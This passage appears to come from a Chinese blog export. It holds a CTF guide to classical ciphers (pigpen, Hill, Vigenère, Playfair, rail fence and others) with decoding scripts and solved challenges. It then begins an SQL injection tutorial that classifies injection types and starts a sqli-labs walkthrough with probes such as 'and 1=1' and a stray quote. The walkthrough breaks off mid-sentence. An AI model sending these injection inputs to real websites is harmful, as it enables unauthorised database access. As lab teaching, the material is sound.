href=\"#标准银河字母：\" class=\"headerlink\" title=\"标准银河字母：\"></a><strong>标准银河字母：</strong></h2><p>标准银河字母（Standard Galactic Alphabet）出自游戏《指挥官基恩》系列。是系列中使用的书写系统。这是一个简单的替代暗号，用不同的符号取代拉丁字母。SGA可以在不同的语言中使用，比如在游戏《Minecraft》，《指挥官基恩》中。</p>\n<p>如果遇到这类题。直接根据题目来进行图翻-&gt;字母</p>\n<p><img src=\"https://pic3.zhimg.com/80/v2-ba0f6c12d8d4c71bc1f36c0faa472272_720w.jpg\" alt=\"img\"></p>\n<h2 id=\"圣堂武士密码：\"><a href=\"#圣堂武士密码：\" class=\"headerlink\" title=\"圣堂武士密码：\"></a><strong>圣堂武士密码：</strong></h2><p>圣堂武士密码(Templar Cipher)是共济会的“猪圈密码”的一个变种,一直被共济会圣殿骑士用。</p>\n<p>直接根据图片上的直接翻译出字母即可</p>\n<p><img src=\"https://pic1.zhimg.com/80/v2-1fbce927928b8189a662418fa9655394_720w.jpg\" alt=\"img\"></p>\n<h2 id=\"猪圈密码：\"><a href=\"#猪圈密码：\" class=\"headerlink\" title=\"猪圈密码：\"></a><strong>猪圈密码：</strong></h2><p>猪圈密码（亦称朱高密码、共济会暗号、共济会密码或共济会员密码），是一种以格子为基础的简单替代式密码。即使使用符号，也不会影响密码分析，亦可用在其它替代式的方法。</p>\n<p>直接图片替换字母即可</p>\n<p><img src=\"https://pic4.zhimg.com/80/v2-c20685d002fe2653944302a1c12a5327_720w.jpg\" alt=\"img\"></p>\n<h3 id=\"猪圈密码在线解密网站：\"><a href=\"#猪圈密码在线解密网站：\" class=\"headerlink\" title=\"猪圈密码在线解密网站：\"></a><strong>猪圈密码在线解密网站：</strong></h3><p><a href=\"https://link.zhihu.com/?target=http%3A//www.metools.info/code/c90.html\" target=\"_blank\" rel=\"noopener\">http://www.metools.info/code/c90.html</a></p>\n<p>猪圈密码真题：</p>\n<p>Buuctf-crypto-萌萌哒的八戒</p>\n<p><img src=\"https://pic4.zhimg.com/80/v2-64cefda059f2f55f522ad0ca6e81f74f_720w.jpg\" alt=\"img\"></p>\n<p>直接解密</p>\n<p><img src=\"https://pic4.zhimg.com/80/v2-87186735e3b7ee8e57ca015e5cecddd3_720w.jpg\" alt=\"img\"></p>\n<p>猪圈密码-圣堂武士密码-标准银河字母-栅栏密码真题：</p>\n<p>Buuctf-Crypto- [MRCTF2020]古典密码知多少</p>\n<p><img src=\"https://pic4.zhimg.com/80/v2-52004a0174178967f87f54236b8d01bf_720w.jpg\" alt=\"img\"></p>\n<p><img src=\"https://pic1.zhimg.com/80/v2-1b31253a3056562005cb5f6ac911ed30_720w.jpg\" alt=\"img\"></p>\n<p>图上的蓝色就是猪圈密码，橙色的是圣堂武士密码，黑色的是银河字母。</p>\n<p><img src=\"https://pic3.zhimg.com/80/v2-61739e1b2e5a4eed51c7bf7abb7a3f26_720w.jpg\" alt=\"img\"></p>\n<p><img src=\"https://pic2.zhimg.com/80/v2-c7a82d3ea6d815257627ee9273676061_720w.jpg\" alt=\"img\"></p>\n<h2 id=\"当铺密码：\"><a href=\"#当铺密码：\" class=\"headerlink\" title=\"当铺密码：\"></a><strong>当铺密码：</strong></h2><p>当铺密码就是一种将中文和数字进行转化的密码，算法相当简单:当前汉字有多少笔画出头，就是转化成数字几。例如：</p>\n<p>口 0    田 0    由 1    中 2    人 3    工 4</p>\n<p>大 5    王 6    夫 7    井 8    羊 9</p>\n<p>具体映射可查看：</p>\n<p><a href=\"https://link.zhihu.com/?target=https%3A//www.cnblogs.com/cc11001100/p/9357263.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/cc11001100/p/9357263.html</a></p>\n<p>当铺密码真题：</p>\n<p>Buuctf-crypto-GKCTF2020汉字的秘密</p>\n<p><img src=\"https://pic2.zhimg.com/80/v2-9abe603c0eef1e0746f91ec04dc24aad_720w.jpg\" alt=\"img\"></p>\n<p><img src=\"https://pic4.zhimg.com/80/v2-fb9478ec0839e5017f8cd83cef8bfbb7_720w.jpg\" alt=\"img\"></p>\n<p>直接解码发现不对。</p>\n<p><img src=\"https://pic4.zhimg.com/80/v2-65054bc4d94d218e47c6b7229e799357_720w.jpg\" alt=\"img\"></p>\n<p>翻看ascii码。改进一下脚本：</p>\n<p>自己猜一下flag开头为flag。可以看到ascii嘛每一位都是递增的。</p>\n<p>差为1,2,3,4</p>\n<p><img src=\"https://pic3.zhimg.com/80/v2-f2ccb7e18e9b325dc067e5d977740536_720w.jpg\" alt=\"img\"></p>\n<h2 id=\"跳舞的小人密码：\"><a href=\"#跳舞的小人密码：\" class=\"headerlink\" title=\"跳舞的小人密码：\"></a><strong>跳舞的小人密码：</strong></h2><p>跳舞的人，讲的是一个黑帮发明的一种密码，其密码就是用一个一个的跳舞的小人组成的，一个小人是一个字母。有人用这种密码进行通信，来威胁某人，福尔摩斯后来破解了这个密码，抓住了坏人。</p>\n<p>这题直接根据表来进行转换即可。加解密同</p>\n<p><img src=\"https://pic1.zhimg.com/80/v2-bfa0f0835ce4a7ec0dae25be5c3d40a4_720w.jpg\" alt=\"img\"></p>\n<p>这题感觉是做过的。但没翻到例题。就不放了。</p>\n<h2 id=\"希尔密码（hill）：\"><a href=\"#希尔密码（hill）：\" class=\"headerlink\" title=\"希尔密码（hill）：\"></a><strong>希尔密码（hill）：</strong></h2><p>希尔密码（Hill Cipher）是运用基本矩阵论原理的替换密码，由Lester S. Hill在1929年发明。每个字母当作26进制数字：A=0, B=1, C=2… 一串字母当成n维向量，跟一个n×n的矩阵相乘，再将得出的结果MOD26。</p>\n<p>直接给出网上的脚本可以参考：</p>\n<pre><code class=\"text\">import numpy as np\n\nm = &#39;YOURPINNOISFOURONETWOSIX&#39;  #明文\na = np.matrix([[11,2,19],[5,23,25],[20,7,17]])  #密钥LCTFXZUHR\nnum_m = []\ntemp = []\ncount = 1\nfor i in m:  #将明文分为三个一组\n    temp.append(ord(i)-ord(&#39;A&#39;))\n    if count % 3 == 0:\n        num_m.append(temp)\n        temp = []\n    count += 1\nmat_m = [np.matrix(i).T for i in num_m]  #将明文分组转换为向量形式\nmat_c = [a * i % 26 for i in mat_m]  #得到密文分组的向量形式\nnum_c = []\ntemp = []\nfor i in mat_c:  #将密文向量转换为列表形式，且合并到一个列表\n    temp = i.tolist()\n    for j in range(3):\n        num_c.append(temp[j][0])\nc = [chr(i+ord(&#39;A&#39;)) for i in num_c]\nprint(&#39;&#39;.join(c))  #连接成字符串,输出密文</code></pre>\n<h3 id=\"希尔密码在线加解密：\"><a href=\"#希尔密码在线加解密：\" class=\"headerlink\" title=\"希尔密码在线加解密：\"></a><strong>希尔密码在线加解密：</strong></h3><p><a href=\"https://link.zhihu.com/?target=http%3A//www.atoolbox.net/Tool.php%3FId%3D914\" target=\"_blank\" rel=\"noopener\">http://www.atoolbox.net/Tool.php?Id=914</a></p>\n<h2 id=\"维吉尼亚密码：\"><a href=\"#维吉尼亚密码：\" class=\"headerlink\" title=\"维吉尼亚密码：\"></a><strong>维吉尼亚密码：</strong></h2><p>维吉尼亚密码（又译维热纳尔密码）是使用一系列凯撒密码组成密码字母表的加密算法，属于多表密码的一种简单形式。</p>\n<p>维吉尼亚加解密表格：</p>\n<p><img src=\"https://pic2.zhimg.com/80/v2-0256b1f8fe704260074c03e4b2696ef5_720w.jpg\" alt=\"img\"></p>\n<p>当明文为</p>\n<p>ATTACKATDAWN</p>\n<p>选择某一关键词并重复而得到密钥，如关键词为LEMON时，密钥为：</p>\n<p>LEMONLEMONLE</p>\n<p>对于明文的第一个字母A，对应密钥的第一个字母L，于是使用表格中L行字母表进行加密，得到密文第一个字母L。类似地，明文第二个字母为T，在表格中使用对应的E行进行加密，得到密文第二个字母X。以此类推，可以得到：</p>\n<p>明文：ATTACKATDAWN</p>\n<p>密钥：LEMONLEMONLE</p>\n<p>密文：LXFOPVEFRNHR</p>\n<h3 id=\"维吉尼亚密码在线加解密：\"><a href=\"#维吉尼亚密码在线加解密：\" class=\"headerlink\" title=\"维吉尼亚密码在线加解密：\"></a><strong>维吉尼亚密码在线加解密：</strong></h3><p><a href=\"https://link.zhihu.com/?target=https%3A//www.qqxiuzi.cn/bianma/weijiniyamima.php\" target=\"_blank\" rel=\"noopener\">https://www.qqxiuzi.cn/bianma/weijiniyamima.php</a></p>\n<p>维吉尼亚密码真题-one：</p>\n<p>BUUCTF-Crypto-[BJDCTF 2nd]燕言燕语-y1ng</p>\n<p>小燕子，穿花衣，年年春天来这里，我问燕子你为啥来，燕子说:</p>\n<p>79616E7A69205A4A517B78696C7A765F6971737375686F635F73757A6A677D20</p>\n<p>16进制转字符串</p>\n<p><img src=\"https://pic1.zhimg.com/80/v2-8a3764498e3bbb3b136a4ff59ac70ba0_720w.jpg\" alt=\"img\"></p>\n<p>维吉尼亚在线直接解</p>\n<p><img src=\"https://pic3.zhimg.com/80/v2-2aa851be441a5f864a0b1306eac29392_720w.jpg\" alt=\"img\"></p>\n<h2 id=\"棋盘密码（Polybius）：\"><a href=\"#棋盘密码（Polybius）：\" class=\"headerlink\" title=\"棋盘密码（Polybius）：\"></a><strong>棋盘密码（Polybius）：</strong></h2><p>波利比奥斯棋盘（Polybius Checkerboard）是棋盘密码的一种，是利用波利比奥斯方阵(Polybius  Square)进行加密的密码方式，产生于公元前两世纪的希腊，相传是世界上最早的一种密码。简单的来说就是把字母排列好，用坐标的形式表现出来。字母是密文，明文便是字母的坐标。</p>\n<p>借鉴知乎上的图</p>\n<p><img src=\"https://pic3.zhimg.com/80/v2-095ef336986fd39db6580115c3a78792_720w.jpg\" alt=\"img\"></p>\n<p>先看纵向，在看横向。得到密文</p>\n<p>明文HELLO 密文：23 15 31 31 34</p>\n<h2 id=\"普莱费尔密码（playfair）：\"><a href=\"#普莱费尔密码（playfair）：\" class=\"headerlink\" title=\"普莱费尔密码（playfair）：\"></a><strong>普莱费尔密码（playfair）：</strong></h2><p>选取一个英文字作密钥。除去重复出现的字母。将密钥的字母逐个逐个加入5×5的矩阵内，剩下的空间将未加入的英文字母依a-z的顺序加入。（将Q去除，或将I和J视作同一字。）</p>\n<p>将要加密的讯息分成两个一组。若组内的字母相同，将X（或Q）插入两字母之间，重新分组（例如 HELLO 将分成 HE LX LO）。若剩下一个字，也加入X字。</p>\n<p>在每组中，找出两个字母在矩阵中的地方。</p>\n<p>若两个字母不在同一直行或同一横列，在矩阵中找出另外两个字母，使这四个字母成为一个长方形的四个角。</p>\n<p>若两个字母在同一横列，取这两个字母右方的字母（若字母在最右方则取最左方的字母）。</p>\n<p>若两个字母在同一直行，取这两个字母下方的字母（若字母在最下方则取最上方的字母）。</p>\n<p>取playfair example为密钥。即可得到表</p>\n<p>P L A Y F</p>\n<p>I R E X M</p>\n<p>B C D G H</p>\n<p>K N O Q S</p>\n<p>T U V W Z</p>\n<p>需要加密的为Hide the gold</p>\n<p>HI DE TH EG OL</p>\n<p>加密后为</p>\n<p>BM OD ZB XD</p>\n<h3 id=\"在线普莱费尔加解密：\"><a href=\"#在线普莱费尔加解密：\" class=\"headerlink\" title=\"在线普莱费尔加解密：\"></a><strong>在线普莱费尔加解密：</strong></h3><p><a href=\"https://link.zhihu.com/?target=http%3A//www.atoolbox.net/Tool.php%3FId%3D912\" target=\"_blank\" rel=\"noopener\">http://www.atoolbox.net/Tool.php?Id=912</a></p>\n<p><a href=\"https://link.zhihu.com/?target=http%3A//rumkin.com/tools/cipher/playfair.php\" target=\"_blank\" rel=\"noopener\">http://rumkin.com/tools/cipher/playfair.php</a></p>\n<p>普莱费尔真题-one：</p>\n<p>Buuctf-crypto-cipher</p>\n<p>还能提示什么呢？公平的玩吧（密钥自己找） Dncnoqqfliqrpgeklwmppu 注意：得到的 flag 请包上 flag{} 提交, flag{小写字母}</p>\n<p><a href=\"https://link.zhihu.com/?target=http%3A//rumkin.com/tools/cipher/playfair.php\" target=\"_blank\" rel=\"noopener\">http://rumkin.com/tools/cipher/playfair.php</a></p>\n<p><img src=\"https://pic2.zhimg.com/80/v2-2be2d0bcb297711754a46296432e8f3d_720w.jpg\" alt=\"img\"></p>\n<h2 id=\"Nihilist密码：\"><a href=\"#Nihilist密码：\" class=\"headerlink\" title=\"Nihilist密码：\"></a><strong>Nihilist密码：</strong></h2><p>Nihilist跟polybius密码差不多</p>\n<p>相同的先看纵向，在看横向。</p>\n<p>例如a=[2,3]=23</p>\n<p><img src=\"https://pic2.zhimg.com/80/v2-929026378b34e6fd342567e8adf92a2d_720w.jpg\" alt=\"img\"></p>\n<h2 id=\"Keyboard密码：\"><a href=\"#Keyboard密码：\" class=\"headerlink\" title=\"Keyboard密码：\"></a><strong>Keyboard密码：</strong></h2><p>Keyboard密码在ctf中应该是分多种类型的。这里提两种。即9键表和26键包含</p>\n<p>9键表就是通过九键上多次字母来进行字母提取</p>\n<p>26键包含通过明文多个字符对应一个密文</p>\n<p>9键表真题：</p>\n<p>直接放两道题来理解</p>\n<p>Buuctf- Crypto-[NCTF2019]Keyboard</p>\n<p><img src=\"https://pic1.zhimg.com/80/v2-7ab75ce548f7ec78fb0dcc1c305d78b8_720w.jpg\" alt=\"img\"></p>\n<p>分析第一个字符串，ooo，o在键盘上对应的是9，有3个o，表示第9个格子的第三个字母，就是y。那yyy就是指字母o</p>\n<p><img src=\"https://pic1.zhimg.com/80/v2-5579f6bceb2f7b7be87c13a30ae19628_720w.jpg\" alt=\"img\"></p>\n<p>cipher=”ooo yyy ii w uuu ee uuuu yyy uuuu y w uuu i i rr w i i rr rrr uuuu rrr uuuu t ii uuuu i w u rrr ee www ee yyy eee www w tt ee”</p>\n<p>base=” qwertyuiop”</p>\n<p>a=[“ “,” “,”abc”,”def”,”ghi”,”jkl”,”mno”,”pqrs”,”tuv”,”wxyz”]</p>\n<p>#print(base.index(“q”))</p>\n<p>for part in cipher.split(“ “):</p>\n<p>  s=base.index(part[0])</p>\n<p>  count=len(part)</p>\n<p>  #print(a[9][2],end=””)</p>\n<p>  print(a[s][count-1],end=””)</p>\n<p>第一步：</p>\n<p><strong>构造3个需要的值，变量和列表</strong></p>\n<p><strong>cipher就是题目附件的字符串</strong></p>\n<p><strong>base就是键盘上一行对应的数字，第一个为空。因为索引的时候，第一个为0。使得q正好为1</strong></p>\n<p><strong>a列表第一个的空格字符串同理。也是0。如下走下来空格对应九格键盘上的1，abc就对应九格键盘上的数字2，def对应3。</strong></p>\n<p>第二步：</p>\n<p>index就是索引的值，就是取键盘上的数字</p>\n<p><img src=\"https://pic2.zhimg.com/80/v2-8370c8c5599d16c927c2a7216487abdd_720w.jpg\" alt=\"img\"></p>\n<p><strong>a[][]。列表的两次，就直接取对应的字母了。end是为了不换行。</strong></p>\n<p><img src=\"https://pic3.zhimg.com/80/v2-24e40bf3a20626da1ee809fac0c5637e_720w.jpg\" alt=\"img\"></p>\n<p><strong>count的减1，还是因为第一个是0</strong></p>\n<p><img src=\"https://pic4.zhimg.com/80/v2-e307810ec18c982899f092d77449e2f3_720w.jpg\" alt=\"img\"></p>\n<p>Buuctf- Crypo-[MRCTF2020]keyboard</p>\n<p>得到的flag用</p>\n<p>MRCTF{xxxxxx}形式上叫</p>\n<p>都为小写字母</p>\n<p>6</p>\n<p>666</p>\n<p>22</p>\n<p>444</p>\n<p>555</p>\n<p>33</p>\n<p>7</p>\n<p>44</p>\n<p>666</p>\n<p>66</p>\n<p>3</p>\n<p><img src=\"https://pic1.zhimg.com/80/v2-857b995784eef5b15242292fdc9d57d4_720w.jpg\" alt=\"img\"></p>\n<p>str=”6 666 22 444 555 33 7 44 666 66 3”</p>\n<p>a=[“ “,” “,”abc”,”def”,”ghi”,”jkl”,”mno”,”pqrs”,”tuv”,”wxyz”]</p>\n<p>for i in str.split(“ “):</p>\n<p>  s=int(i[0])</p>\n<p>  count=len(i)</p>\n<p>  print(a[s][count-1],end=””)</p>\n<p><strong>这边解出来最后一个字母是d。但提交不上。搜一下这个单词就知道最后一个应该打错了。是e</strong></p>\n<p>26键包含真题：</p>\n<p>实验吧-密码学-keyword</p>\n<p><img src=\"https://pic4.zhimg.com/80/v2-e070e8a0e26fa380290d53e7d2704093_720w.jpg\" alt=\"img\"></p>\n<p>根据题目hint：应该。是键盘包围，或者画图</p>\n<p>BHUK,LP TGBNHGYT BHUK,LP UYGBN TGBNHGYT BHUK,LP BHUK,LP TGBNHGYT BHUK,LP TGBNHGYT UYGBN</p>\n<p>空格划组 逗号也算一个里面</p>\n<p>直接画出来</p>\n<p>NBNCBNNBNBC</p>\n<h2 id=\"栅栏密码：\"><a href=\"#栅栏密码：\" class=\"headerlink\" title=\"栅栏密码：\"></a><strong>栅栏密码：</strong></h2><p>栅栏密码是典型的置换密码。把明文分成n个1组。在进行连接。根据如何连接，又分为普通栅栏密码（|||栅栏密码）和W型栅栏密码。</p>\n<p>普通栅栏密码（|||栅栏密码）</p>\n<p>值和n：</p>\n<p>fslda1g2{3a}</p>\n<p>n=2</p>\n<p>按2个分组</p>\n<p>fs  ld  a1  g2  {3  a}</p>\n<p>取第一个</p>\n<p>flag{a</p>\n<p>在取全部</p>\n<p>flag{asd123}</p>\n<p>普通栅栏密码（|||栅栏密码）真题-one：</p>\n<p>Buuctf-Crypto-篱笆墙的影子</p>\n<p>直接两栏获得flag</p>\n<p><img src=\"https://pic1.zhimg.com/80/v2-ecb70e84f97468a9c5eed6923bc6a2f0_720w.jpg\" alt=\"img\"></p>\n<p>w型栅栏密码</p>\n<p>写成W型的栅栏密码。但读取还是按行从左往右读取。</p>\n<p>值和n：</p>\n<p>flag{asd123}</p>\n<p>n=2</p>\n<p>照样是2个分组</p>\n<p>f.a.{.s.1.3</p>\n<p>.l.g.a.d.2.}</p>\n<p>直接从左往右读取</p>\n<p>fa{s13lgad2}</p>\n<p>W型栅栏密码真题-one：</p>\n<p>攻防世界Crypto新手-Railfence</p>\n<p>根据题目名和题目描述可知是栅栏密码。</p>\n<p><img src=\"https://pic4.zhimg.com/80/v2-bb5b130d16c4a1530b1a1d0403ee7e8f_720w.jpg\" alt=\"img\"></p>\n<p>但不是普通的|||型栅栏密码</p>\n<p>是变种的W型栅栏密码</p>\n<h3 id=\"在线解密：\"><a href=\"#在线解密：\" class=\"headerlink\" title=\"在线解密：\"></a><strong>在线解密：</strong></h3><p><a href=\"https://link.zhihu.com/?target=http%3A//www.atoolbox.net/Tool.php%3FId%3D777\" target=\"_blank\" rel=\"noopener\">http://www.atoolbox.net/Tool.php?Id=777</a></p>\n<p><img src=\"https://pic3.zhimg.com/80/v2-090a754d2d59387491b0becd12bf1c92_720w.jpg\" alt=\"img\"></p>\n<p>手解：</p>\n<p>把值按照W型进行横排排列，把明文的第一个填充到密文的第一行第1个位置，把明文的第二个填充到密文的第一行第9个位置。在把明文的第三个填充到密文的第17个位置。在把明文的第四个填充到密文的第25个位置。在把明文的第五个填充到密文的第33个位置。</p>\n<p><img src=\"https://pic1.zhimg.com/80/v2-bdccd3e6610deff7b3399f83385cd15c_720w.jpg\" alt=\"img\"></p>\n<p>当len=35，key=5时（这个就自己画一画吧）然后你就会发现：首行和尾行的间隔依旧不变，假设行数为i，当当前数为第2行的奇数的时候，下一个数字为2+6=8也就是（key-i）<em>2,若当前数为第二行偶数的时候，下一个数字为8+2=10也就是(i-1)</em>2。</p>\n<p><img src=\"https://pic4.zhimg.com/80/v2-02d6283fe27ea56f8d866bd028d3189f_720w.jpg\" alt=\"img\"></p>\n<h4 id=\"普通栅栏密码加解密：\"><a href=\"#普通栅栏密码加解密：\" class=\"headerlink\" title=\"普通栅栏密码加解密：\"></a>普通栅栏密码加解密：</h4><p><a href=\"https://link.zhihu.com/?target=https%3A//www.qqxiuzi.cn/bianma/zhalanmima.php\" target=\"_blank\" rel=\"noopener\">https://www.qqxiuzi.cn/bianma/zhalanmima.php</a></p>\n<h4 id=\"W型栅栏密码在线加解密：\"><a href=\"#W型栅栏密码在线加解密：\" class=\"headerlink\" title=\"W型栅栏密码在线加解密：\"></a>W型栅栏密码在线加解密：</h4><p><a href=\"https://link.zhihu.com/?target=http%3A//www.atoolbox.net/Tool.php%3FId%3D777\" target=\"_blank\" rel=\"noopener\">http://www.atoolbox.net/Tool.php?Id=777</a></p>\n<h2 id=\"云影密码：\"><a href=\"#云影密码：\" class=\"headerlink\" title=\"云影密码：\"></a><strong>云影密码：</strong></h2><p>有1，2，4，8这四个数字，可以通过加法来用这四个数字表示0-9中的任何一个数字，列如0=28， 也就是0=2+8，同理7=124，  9=18。这样之后再用1-26来表示26个英文字母，就有了密文与明文之间的对应关系。引入0来作为间隔，以免出现混乱。所以云影密码又叫“01248密码”。</p>\n<p>也给出一个python脚本地址：</p>\n<p><a href=\"https://link.zhihu.com/?target=https%3A//www.jianshu.com/p/b5aa5cf60f83\" target=\"_blank\" rel=\"noopener\">https://www.jianshu.com/p/b5aa5cf60f83</a></p>\n<pre><code class=\"text\">#!/usr/bin/python\n# -*- coding=utf8 -*-\n&quot;&quot;&quot;\n# @Author : pig\n# @CreatedTime:2019-11-2423:54:02\n# @Description : \n&quot;&quot;&quot;\n\n\ndef de_code(c):\n    dic = [chr(i) for i in range(ord(&quot;A&quot;), ord(&quot;Z&quot;) + 1)]\n    flag = []\n    c2 = [i for i in c.split(&quot;0&quot;)]\n    for i in c2:\n        c3 = 0\n        for j in i:\n            c3 += int(j)\n        flag.append(dic[c3 - 1])\n    return flag\n\ndef encode(plaintext):\n    dic = [chr(i) for i in range(ord(&quot;A&quot;), ord(&quot;Z&quot;) + 1)]\n    m = [i for i in plaintext]\n    tmp = [];flag = []\n    for i in range(len(m)):\n        for j in range(len(dic)):\n            if m[i] == dic[j]:\n                tmp.append(j + 1)\n    for i in tmp:\n        res = &quot;&quot;\n        if i &gt;= 8:\n            res += int(i/8)*&quot;8&quot;\n        if i%8 &gt;=4:\n            res += int(i%8/4)*&quot;4&quot;\n        if i%4 &gt;=2:\n            res += int(i%4/2)*&quot;2&quot;\n        if i%2 &gt;= 1:\n            res += int(i%2/1)*&quot;1&quot;\n        flag.append(res + &quot;0&quot;)\n    print (&quot;&quot;.join(flag)[:-1])\n\nc = input(&quot;输入要解密的数字串:&quot;)\nprint (de_code(c))\nm_code = input(&quot;请输入要加密的数字串:&quot;)\nencode(m_code)</code></pre>\n<h2 id=\"简单位移密码：\"><a href=\"#简单位移密码：\" class=\"headerlink\" title=\"简单位移密码：\"></a><strong>简单位移密码：</strong></h2><p>这个密码是我在《ctf特训营》这本书上看到的。自己并没有在题目中做到过</p>\n<p>实例借鉴书中</p>\n<p>m=flag{easy_easy_crypto}</p>\n<p>k=”3124”</p>\n<p>len(k)=4，切分m。</p>\n<p>flay {eas y_ea sy_c rypt o}</p>\n<p>按照3124直接排列</p>\n<p>Lafg ea{s _eya y_sc yprt }o</p>\n<p>密文：</p>\n<p>Lafgea{s_eyay_scyprt}o</p>\n<p>解密代码：</p>\n<pre><code class=\"text\">def shift_decrypt(c,k):\n    l=len(k)\n    m=&quot;&quot;\n    for i in range(0,len(c),l):\n        tmp_m=[&quot;&quot;]*l\n        if i+l&gt;=len(c):\n            tmp_c=c[i:]\n            use=[]\n            for kindex in range(len(tmp_c)):\n                use.append(int(k[kindex])-l)\n            use.sort()\n            for kindex in range(len(tmp_c)):\n                tmp_m[kindex]=tmp_c[use.index(int(k[kindex])-l)]\n        else:\n            tmp_c=c[i:i+l]\n            for kindex in range(len(tmp_c)):\n                tmp_m[kindex]=tmp_c[int(k[kindex])-1]\n        m+=&quot;&quot;.join(tmp_m)\n    return m\nc=&quot;lafgea{s_eyay_scyprt}o&quot;\nk=&quot;3124&quot;\nprint shift_decrypt(c,k)</code></pre>\n<h2 id=\"曲路密码：\"><a href=\"#曲路密码：\" class=\"headerlink\" title=\"曲路密码：\"></a><strong>曲路密码：</strong></h2><p>按照事先约定的原则把明文填入表中</p>\n<p>例如：明文为HelloWorldab</p>\n<p><img src=\"https://pic3.zhimg.com/80/v2-c8e5bd0d1dfa3ececd04d2d2bd49863a_720w.jpg\" alt=\"img\"></p>\n<p>按照一定的顺序进行遍历</p>\n<p>密文就是lrbaoleWdloH</p>\n<p><strong>CTF crypto线下工具推荐：</strong></p>\n<p><strong>CTFCrackTools</strong></p>\n<p><a href=\"https://link.zhihu.com/?target=https%3A//github.com/Acmesec/CTFCrackTools\" target=\"_blank\" rel=\"noopener\">https://github.com/Acmesec/CTFCrackTools</a></p>\n<p><img src=\"https://pic4.zhimg.com/80/v2-1131910e2546d1455cf91261f8369e73_720w.jpg\" alt=\"img\"></p>\n<p><strong>CyberChef</strong></p>\n<p><a href=\"https://link.zhihu.com/?target=https%3A//www.chinabaiker.com/cyberchef.htm\" target=\"_blank\" rel=\"noopener\">https://www.chinabaiker.com/cyberchef.htm</a></p>\n<p>直接可以下载到本地</p>\n<p><img src=\"https://pic1.zhimg.com/80/v2-aa7579316f632a3a6351bb73f1bf9840_720w.jpg\" alt=\"img\"></p>\n<p><strong>参考：</strong></p>\n<p><a href=\"https://link.zhihu.com/?target=https%3A//ctf-wiki.github.io/ctf-wiki/crypto\" target=\"_blank\" rel=\"noopener\">https://ctf-wiki.github.io/ctf-wiki/crypto</a></p>\n<p><a href=\"https://link.zhihu.com/?target=https%3A//zh.wikipedia.org/wiki\" target=\"_blank\" rel=\"noopener\">https://zh.wikipedia.org/wiki</a></p>\n<p><a href=\"https://link.zhihu.com/?target=https%3A//baike.baidu.com\" target=\"_blank\" rel=\"noopener\">https://baike.baidu.com</a></p>\n<p>《ctf特训营》</p>\n<p><a href=\"https://link.zhihu.com/?target=https%3A//buuoj.cn/\" target=\"_blank\" rel=\"noopener\">https://buuoj.cn/</a></p>\n<p><strong>相关实验：</strong></p>\n<p>相关实验：密码学原理</p>\n<p><a href=\"https://link.zhihu.com/?target=https%3A//sourl.cn/9cMsyV\" target=\"_blank\" rel=\"noopener\">课程:密码学原理(合天网安实验室)</a></p>\n<p>（密码学是研究如何隐密地传递信息的学科。通过本课程实验掌握密码学的相关知识。）</p>\n"},{"layout":"post","title":"SQL注入总结","date":"2020-10-13T16:00:00.000Z","description":"注，都可以注~","_content":"\n# SQL注入总结（持续更新）\n\n## SQL注入 \n\nSQL注入是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令de web攻击方式。\n\n由于WEB开发人员几乎不可能对所有输入进行检测，所以SQL注入漏洞几乎是最常见，最广泛的漏洞类型\n\n> 按照注入点类型来分类\n\n### （1）数字型注入点\n\n许多网页链接有类似的结构 http://xxx.com/users.php?id=1 基于此种形式的注入，一般被叫做数字型注入点，缘由是其注入点 id 类型为数字，在大多数的网页中，诸如 查看用户个人信息，查看文章等，大都会使用这种形式的结构传递id等信息，交给后端，查询出数据库中对应的信息，返回给前台。\n\n这一类的 SQL 语句原型大概为 `select * from 表名 where id=1 ` 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：`select * from 表名 where id=1 and 1=1`\n\n### （2）字符型注入点\n\n网页链接有类似的结构 http://xxx.com/users.php?name=admin 这种形式，其注入点 name 类型为字符类型，所以叫字符型注入点。这一类的 SQL 语句原型大概为 `select * from 表名 where name='admin'` 值得注意的是这里相比于数字型注入类型的sql语句原型多了引号，可以是单引号或者是双引号。\n\n若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：`select * from 表名 where name='admin' and 1=1 '` 我们需要将这些烦人的引号给处理掉。\n\n### （3）搜索型注入点\n\n这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有 `\"keyword=关键字\"` 有的不显示在的链接地址里面，而是直接通过搜索框表单提交。\n\n此类注入点提交的 SQL 语句，其原形大致为：`select * from 表名 where 字段 like '%关键字%'` 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：`select * from 表名 where 字段 like '%测试%' and '%1%'='%1%'`\n\n> 按照数据提交的方式来分类\n\n### （1）GET 注入\n\n提交数据的方式是 GET , 注入点的位置在 GET 参数部分。比如有这样的一个链接http://xxx.com/index.php?id=1 , id 是注入点。\n\n### （2）POST 注入\n\n使用 POST 方式提交数据，注入点位置在 POST 数据部分，常发生在表单中。\n\n### （3）Cookie 注入\n\nHTTP 请求的时候会带上客户端的 Cookie, 注入点存在 Cookie 当中的某个字段中。\n\n### （4）HTTP 头部注入\n\n注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中。严格讲的话，Cookie 其实应该也是算头部注入的一种形式。因为在 HTTP 请求的时候，Cookie 是头部的一个字段。\n\n> 按照执行效果来分类\n\n### （1）基于布尔的盲注\n\n即可以根据返回页面判断条件真假的注入。\n\n### （2）基于时间的盲注\n\n即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。\n\n### （3）基于报错注入\n\n即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。\n\n1. 单引号\n2. 双引号\n3. 基于数字型注入\n\n### （4）联合查询注入\n\n可以使用union的情况下的注入。\n\n### （5）堆查询注入\n\n可以同时执行多条语句的执行时的注入。\n\n### （6）宽字节注入\n\n宽字节注入是利用mysql的一个特性，mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ASCII码要大于128，才到汉字的范围）\n\n### 基于sqli-labs的实践操作\n\n#### 1.基于报错的GET sql注入\n\n##### less-1\n\n![](/img/less-1.png)\n\n提示说输入一个数字作为ID的值\n\n那么先在url输入?id=1\n\n![](/img/less-1输入id=1.png)\n\n显示查询成功，返回了用户Dumb\n\n然后尝试使其报错，输入 ?id=1'\n\n![](/img/less-1输入id-1'.png)\n\n报错了，显示为 ''1'' LIMIT 0,1'\n\n有了这个，我们就可以揣测一下网站后端的sql请求语句了\n\n首先，这个报错语句是被 ' ' 